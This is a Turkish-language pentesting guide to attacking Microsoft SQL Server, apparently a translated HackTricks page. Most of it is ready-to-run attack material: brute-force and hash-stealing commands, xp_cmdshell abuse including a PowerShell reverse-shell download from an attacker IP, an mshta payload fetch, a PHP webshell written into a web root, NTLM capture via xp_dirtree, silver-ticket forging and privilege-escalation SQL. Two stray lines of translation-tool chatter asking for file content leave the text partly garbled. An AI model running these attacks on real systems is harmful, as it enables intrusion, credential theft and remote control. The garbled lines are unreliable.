# 1433 - Pentesting MSSQL - Microsoft SQL Server

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Kaynak: [wikipedia](https://en.wikipedia.org/wiki/Microsoft_SQL_Server):

> **Microsoft SQL Server**, Microsoft tarafından geliştirilen bir **ilişkisel veritabanı** yönetim sistemidir. Veritabanı sunucusu olarak, diğer yazılım uygulamaları tarafından istendiğinde verileri depolama ve geri getirme birincil işlevine sahip bir yazılım ürünüdür—bu uygulamalar aynı bilgisayarda veya ağ üzerinden (İnternet dahil) başka bir bilgisayarda çalışabilir.

**Varsayılan port:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### Yönetilen Database-as-a-Service (DBaaS) ile karşılaşma

"owning the host"’a (örn., privilege escalation, lateral movement, ve OS command execution) dayanan her şey DBaaS ortamlarında ortadan kalkar. Bu ortamlarda pentesting, application-layer exploitation, data exfiltration via SQL logic, misconfigured IAM roles veya zayıf network/VPC tasarımına yönelmelidir. Örneğin, the [Amazon RDS documentation](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/SQLServer.Concepts.General.FeatureNonSupport.html) açıkça belirtir ki `xp_cmdshell` ve `TRUSTWORTHY` veritabanı özelliği desteklenmez.

> [!WARNING]
> Bir sunucu değil, bir database endpoint’i alırsınız. Bulut sağlayıcı host OS, database engine ikili dosyalarını ve birçok güvenlik politikasını yönetir.

### **Default MS-SQL System Tables**

- **master Database**: Bu veritabanı, bir SQL Server örneği için tüm sistem düzeyi ayrıntılarını yakaladığı için kritik öneme sahiptir.
- **msdb Database**: SQL Server Agent, uyarılar ve job’ların zamanlamasını yönetmek için bu veritabanını kullanır.
- **model Database**: SQL Server örneğindeki her yeni veritabanı için bir şablon görevi görür; boyut, collation, recovery model ve benzeri yapılan değişiklikler yeni oluşturulan veritabanlarına yansır.
- **Resource Database**: SQL Server ile birlikte gelen sistem nesnelerini barındıran salt okunur bir veritabanıdır. Bu nesneler fiziksel olarak Resource veritabanında depolansa da, mantıksal olarak her veritabanının sys şemasında sunulur.
- **tempdb Database**: Geçici nesneler veya ara sonuç kümeleri için geçici bir depolama alanı görevi görür.

## Enumeration

### Automatic Enumeration

Servis hakkında hiçbir şey bilmiyorsanız:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
> [!TIP]
> Eğer **don't** **have credentials** iseniz, onları tahmin etmeyi deneyebilirsiniz. nmap veya metasploit kullanabilirsiniz. Dikkatli olun, mevcut bir kullanıcı adıyla birkaç kez login denemesinde başarısız olursanız **block accounts** oluşabilir.
  
#### Metasploit (need creds)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute force**](../../generic-hacking/brute-force.md#sql-server)

### **User Enumeration via RID Brute Force**

MSSQL üzerinden brute-forcing RIDs (Relative Identifiers) ile etki alanı kullanıcılarını tespit edebilirsiniz. Bu teknik, geçerli kimlik bilgilerine sahip fakat sınırlı ayrıcalıklarınız olduğunda kullanışlıdır:
```bash
# Using NetExec (nxc) - formerly CrackMapExec
nxc mssql <IP> --local-auth -u <username> -p '<password>' --rid-brute 5000

# Examples:
nxc mssql 10.129.234.50 --local-auth -u sqlguest -p 'zDPBpaF4FywlqIv11vii' --rid-brute 5000
nxc mssql 10.10.10.59 -u sa -p 'P@ssw0rd' --rid-brute 10000

# Without --local-auth for domain accounts
nxc mssql 10.10.10.59 -u DOMAIN\\user -p 'password' --rid-brute 5000
```
Dosya içeriğini sağlamadınız. Lütfen src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md dosyasının içeriğini yapıştırın; ardından isteğinize göre Türkçeye çevirisini, markdown ve HTML sözdizimini bozmadan yapacağım.
```
[snippet]
MSSQL                    10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL                    10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL                    10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
MSSQL                    10.129.234.50   1433   DC               1107: REDELEGATE\Michael.Pontiac
MSSQL                    10.129.234.50   1433   DC               1108: REDELEGATE\Mallory.Roberts
MSSQL                    10.129.234.50   1433   DC               1109: REDELEGATE\James.Dinkleberg
[snippet]
```
**Parametreler:**
- `--local-auth`: Domain yerine yerel kimlik doğrulamasını kullan
- `--rid-brute <max_rid>`: Belirtilen sayıya kadar RID'leri brute force ile dene (varsayılan: 4000)
- `-u`: Kullanıcı adı
- `-p`: Parola

Bu teknik, ardışık RID'lerle ilişkili hesap bilgilerini sorgulayarak kullanıcıları listeleyecektir.

### Manuel Listeleme

#### Giriş

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### Yaygın Keşif
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```
#### Kullanıcıyı Al


{{#ref}}
types-of-mssql-users.md
{{#endref}}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### İzinleri Alma

1. **Securable:** SQL Server tarafından erişim kontrolü için yönetilen kaynaklar olarak tanımlanır. Bunlar şu kategorilere ayrılır:
- **Server** – Örnekler: veritabanları, logins, endpoints, availability groups ve sunucu rolleri.
- **Database** – Örnekler: database rolleri, application rolleri, şema, sertifikalar, full text katalogları ve kullanıcılar.
- **Schema** – Tablolar, view'lar, prosedürler, fonksiyonlar, synonyms vb. içerir.  
2. **Permission:** SQL Server securable'larıyla ilişkili izinlerdir; ALTER, CONTROL ve CREATE gibi izinler bir principal'e verilebilir. İzinlerin yönetimi iki düzeyde yapılır:
- **Server Level** — logins kullanılarak
- **Database Level** — users kullanılarak
3. **Principal:** Bu terim securable'a izin verilen varlığı ifade eder. Principallar ağırlıklı olarak logins ve database kullanıcılarını içerir. Securable'lara erişim kontrolü, izinlerin verilmesi veya reddedilmesiyle ya da logins ve kullanıcıların erişim haklarına sahip rollerde dahil edilmesiyle sağlanır.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## İpuçları

### İşletim Sistemi Komutlarını Çalıştır

> [!CAUTION]
> Komutları çalıştırabilmek için yalnızca **`xp_cmdshell`**'in **etkinleştirilmiş** olması yeterli değildir; ayrıca **`xp_cmdshell`** saklı yordamı üzerinde **EXECUTE permission**'a da sahip olmanız gerekir. **`xp_cmdshell`**'i kimlerin (sysadmins hariç) kullanabildiğini şu sorguyla öğrenebilirsiniz:
>
> ```sql
> Use master
> EXEC sp_helprotect 'xp_cmdshell'
> ```
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Executing custom assembly on the current server with windows authentication and executing hostname command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
```
### WMI-based uzaktan SQL toplama (sqlcmd + CSV export)

Operatörler, IIS/app katmanından SQL Servers'a pivot yapıp WMI kullanarak MSSQL'e kimlik doğrulayan ve ad‑hoc sorgular çalıştıran küçük bir batch çalıştırabilir, sonuçları CSV'ye dışa aktarabilir. Bu yöntem toplama işlemini basit tutar ve admin etkinlikleriyle karışır.

Örnek mssq.bat
```bat
@echo off
rem Usage: mssq.bat <server> <user> <pass> <"SQL"> <out.csv>
set S=%1
set U=%2
set P=%3
set Q=%4
set O=%5
rem Remove headers, trim trailing spaces, CSV separator = comma
sqlcmd -S %S% -U %U% -P %P% -Q "SET NOCOUNT ON; %Q%" -W -h -1 -s "," -o "%O%"
```
Bunu WMI ile uzaktan çalıştırın.
```cmd
wmic /node:SQLHOST /user:DOMAIN\user /password:Passw0rd! process call create "cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd \"SELECT TOP(100) name FROM sys.tables\" C:\\Windows\\Temp\\out.csv"
```
PowerShell alternatifi
```powershell
$cmd = 'cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd "SELECT name FROM sys.databases" C:\\Windows\\Temp\\dbs.csv'
Invoke-WmiMethod -ComputerName SQLHOST -Class Win32_Process -Name Create -ArgumentList $cmd
```
Notlar
- sqlcmd eksik olabilir; osql, PowerShell Invoke-Sqlcmd veya System.Data.SqlClient kullanan bir one‑liner'a geri dönün.
- Tırnak kullanımına dikkat edin; uzun/karmaşık sorguları bir dosya aracılığıyla veya batch/PowerShell stub içinde çözülen Base64‑encoded bir argüman olarak vermek daha kolaydır.
- CSV'yi SMB üzerinden exfil edin (ör. \\SQLHOST\C$\Windows\Temp'ten kopyalayın) veya sıkıştırıp C2'niz üzerinden taşıyın.

### Hashlenmiş şifreleri al
```bash
SELECT * FROM master.sys.syslogins;
```
### NetNTLM hash'ini çalma / Relay attack

Kimlik doğrulamada kullanılan hash'i yakalamak için bir **SMB server** başlatmalısınız (örneğin `impacket-smbserver` veya `responder`).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
> [!WARNING]
> Bu MSSQL fonksiyonlarını kimlerin (sysadmins dışında) çalıştırma iznine sahip olduğunu şu şekilde kontrol edebilirsiniz:
>
> ```sql
> Use master;
> EXEC sp_helprotect 'xp_dirtree';
> EXEC sp_helprotect 'xp_subdirs';
> EXEC sp_helprotect 'xp_fileexist';
> ```

responder veya Inveigh gibi araçları kullanarak NetNTLM hash'ini çalmak mümkündür.\
Bu araçların nasıl kullanılacağını şurada görebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

#### NetNTLMv2 yakalamadan MSSQL silver ticket'e (PAC group injection)
- SQL Server servis hesabının NetNTLMv2'sini Responder ile `xp_dirtree '\\\\<attacker_ip>\\share'` aracılığıyla yakalayın (kırmak için Hashcat mode 5600).
- Kurtarılan paroladan service NTLM hash'ini türetin:
```python
python3 - <<'PY'
import hashlib
print(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).hexdigest())
PY
```
- Alan SID baytlarını `SELECT SUSER_SID('DOMAIN\\Domain Users');` ile alın (RID = son 4 bayt, little endian). `nxc mssql ... --rid-brute` ile Map/brute RIDs yaparak sysadmin yetkisi veren bir grup bulun (ör. RID `1105`).
- MSSQL SPN için, ayrıcalıklı grup RID'i PAC'e enjekte edilmiş bir silver ticket oluşturun:
```bash
ticketer.py -nthash <SERVICE_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn MSSQLSvc/<fqdn>:1433 -groups <GROUP_RID> <user_to_impersonate>
KRB5CCNAME=<user_to_impersonate>.ccache mssqlclient.py -no-pass -k <fqdn>
```
- Gerekirse `xp_cmdshell`'i etkinleştirin; komutlar, sahte bilet ile taklit ediliyor olunsa bile SQL Server servis hesabı olarak çalışır.

### MSSQL trusted Links'ın kötüye kullanımı

[**Bu yazıyı okuyun**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **bu özelliğin nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:**


{{#ref}}
../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md
{{#endref}}

### **Dosya Yazma**

`MSSQL` kullanarak dosya yazmak için [**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)'u **etkinleştirmemiz gerekir**, bu işlem yönetici ayrıcalıkları gerektirir; ardından dosyayı oluşturmak için bazı stored procedures çalıştırılır:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Dosya oku ile** OPENROWSET

Varsayılan olarak, `MSSQL` **hesabın okuma erişimi olan işletim sistemindeki herhangi bir dosyayı okuma** izni verir. Aşağıdaki SQL sorgusunu kullanabiliriz:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Ancak, **`BULK`** seçeneği **`ADMINISTER BULK OPERATIONS`** veya **`ADMINISTER DATABASE BULK OPERATIONS`** izni gerektirir.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### SQLi için hata tabanlı vektör:
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Read files executing scripts (Python and R)**

MSSQL, **Python ve/veya R** ile **script** çalıştırmanıza izin verebilir. Bu kodlar, komutları çalıştırmak için **xp_cmdshell** kullanan kullanıcıdan **farklı bir kullanıcı** tarafından çalıştırılacaktır.

Örnek: **'R'** _"Hellow World!"_ çalıştırmayı deneme — **çalışmıyor**:

![](<../../images/image (393).png>)

Örnek: yapılandırılmış python kullanarak birkaç işlem gerçekleştirme:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Kayıt Defterini Oku

Microsoft SQL Server, yalnızca ağla değil, dosya sistemiyle ve hatta [**Windows Registry**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)**:** ile de etkileşim kurmanızı sağlayan **multiple extended stored procedures** sağlar:

| **Normal**                 | **Instance Bilinçli**                 |
| --------------------------- | ------------------------------------ |
| sys.xp_regread              | sys.xp_instance_regread              |
| sys.xp_regenumvalues        | sys.xp_instance_regenumvalues        |
| sys.xp_regenumkeys          | sys.xp_instance_regenumkeys          |
| sys.xp_regwrite             | sys.xp_instance_regwrite             |
| sys.xp_regdeletevalue       | sys.xp_instance_regdeletevalue       |
| sys.xp_regdeletekey         | sys.xp_instance_regdeletekey         |
| sys.xp_regaddmultistring    | sys.xp_instance_regaddmultistring    |
| sys.xp_regremovemultistring | sys.xp_instance_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
Daha fazla örnek için [**orijinal kaynağa**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/) göz atın.

### RCE with MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

MSSQL içinde **özel fonksiyonlarla .NET dll yüklemek** mümkündür. Ancak bu, **`dbo` erişimi gerektirir**, bu yüzden veritabanına **`sa` veya bir Administrator rolü olarak** bağlanmanız gerekir.

[**Bu bağlantıya**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp) bir örnek için bakın.

### RCE with `autoadmin_task_agents`

Bu [**gönderiye göre**](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp), uzak bir dll yükleyip MSSQL'in bunu şu şekilde çalıştırmasını sağlamak da mümkündür:
```sql
update autoadmin_task_agents set task_assembly_name = "class.dll", task_assembly_path="\\remote-server\\ping.dll",className="Class1.Class1";
```
I need the content to translate. Please paste the text of src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md (or the portion you want translated).
```csharp
using Microsoft.SqlServer.SmartAdmin;
using System;
using System.Diagnostics;

namespace Class1
{
public class Class1 : TaskAgent
{
public Class1()
{

Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c ping localhost -t";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
process.WaitForExit();
}

public override void DoWork()
{

}

public override void ExternalJob(string command, LogBaseService jobLogger)
{

}

public override void Start(IServicesFactory services)
{

}

public override void Stop()
{

}


public void Test()
{

}
}
}
```
### RCE için diğer yollar

Komut çalıştırma elde etmek için başka yöntemler de vardır; örneğin [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), ve [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql) eklemek.

## MSSQL Privilege Escalation

### db_owner'dan sysadmin'e

Eğer bir **regular user**'e **`db_owner`** rolü, **admin tarafından sahip olunan veritabanı** üzerinde verilmişse (örneğin **`sa`**) ve o veritabanı **`trustworthy`** olarak yapılandırılmışsa, bu kullanıcı bu ayrıcalıkları **privesc** için kötüye kullanabilir; çünkü orada oluşturulan **stored procedures** sahibi olarak **execute** edebilir (**admin**).
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Kullanabileceğiniz bir **metasploit** modülü:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Veya bir **PS** betiği:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Diğer kullanıcıların taklit edilmesi

SQL Server'ın **`IMPERSONATE`** adlı özel bir izni vardır; bu izin, **yürütmeyi yapan kullanıcının başka bir kullanıcı veya login'in izinlerini üstlenmesine**, bağlam sıfırlanana veya oturum sona erene kadar olanak tanır.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# If you can't find any users, make sure to check for links
enum_links
# If there is a link of interest, re-run the above steps on each link
use_link [NAME]
```
> [!TIP]
> Eğer bir kullanıcıyı taklit edebiliyorsanız, kullanıcı sysadmin olmasa bile, kullanıcının diğer **veritabanlarına** veya bağlı sunuculara **erişimi olup olmadığını** kontrol etmelisiniz.

Unutmayın ki bir kez sysadmin olduğunuzda, herhangi bir başkasını taklit edebilirsiniz:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Bu saldırıyı bir **metasploit** modülü ile gerçekleştirebilirsiniz:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
veya bir **PS** script ile:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Using MSSQL for Persistence

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## Extracting passwords from SQL Server Linked Servers

Bir saldırgan, SQL Instances üzerinden SQL Server Linked Servers şifrelerini çıkarıp düz metin olarak elde edebilir; bu da saldırgana hedef üzerinde daha geniş bir yer edinmek için kullanılabilecek şifreler sağlar. Linked Servers için depolanan şifreleri çıkarmak ve şifrelerini çözmek için kullanılan script [here](https://www.richardswinbank.net/admin/extract_linked_server_passwords) adresinde bulunabilir.

Bu exploit'in çalışması için bazı gereksinimler ve yapılandırmalar yapılmalıdır. Öncelikle makinede Administrator haklarına sahip olmanız veya SQL Server yapılandırmalarını yönetme yetkisine sahip olmanız gerekir.

Yetkilerinizi doğruladıktan sonra aşağıdaki üç şeyi yapılandırmanız gerekir:

1. SQL Server instances üzerinde TCP/IP'i etkinleştirin;
2. Bir Start Up parametresi ekleyin; bu durumda eklenecek trace flag -T7806'dır.
3. Uzaktan admin bağlantısını etkinleştirin.

Bu yapılandırmaları otomatikleştirmek için [this repository ](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) gerekli scriptleri içerir. Her yapılandırma adımı için bir powershell scripti olmasının yanı sıra, repository ayrıca yapılandırma scriptlerini ve şifrelerin çıkarılması ile şifre çözülmesini birleştiren tam bir script içerir.

Bu saldırı hakkında daha fazla bilgi için aşağıdaki linklere bakın: [Decrypting MSSQL Database Link Server Passwords](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Troubleshooting the SQL Server Dedicated Administrator Connection](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Local Privilege Escalation

MSSQL server'ı çalıştıran kullanıcı, **SeImpersonatePrivilege** ayrıcalık token'ına sahip olacaktır.\
